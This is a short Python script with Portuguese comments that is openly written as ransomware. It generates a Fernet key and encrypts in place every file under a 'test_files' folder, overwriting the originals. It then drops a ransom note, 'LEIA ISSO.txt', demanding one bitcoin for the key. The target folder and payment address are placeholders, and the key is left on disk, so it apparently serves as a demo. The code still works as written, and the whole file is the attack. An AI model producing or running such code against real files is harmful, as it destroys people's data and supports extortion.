from cryptography.fernet import Fernet
import os 

#gerar uma chave de criptografia e salvar 
def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chaves_files:
        chaves_files.write(chave)

#carregar a chave salva
def carregar_chave():
    return open("chave.key", "rb").read()

#criptografar um único arquivo
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)

#encontrar arquivos para criptografar
def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransoware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

#mensagem de resgate
def criar_mensagem_resgate():
    with open("LEIA ISSO.txt", "w") as f:
        f.write("seus arquivos foram criptografados!\n")
        f.write("Enviar 1 bitcoin para o endereço x e enviar o comprovante!\n")
        f.write("depois disso, enviaremos a chave para você recuperar seus dados\n")

#execução principal
def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
    print("Ransoware executado! Arquivos Criptografados!")

if __name__ == "__main__":
    main()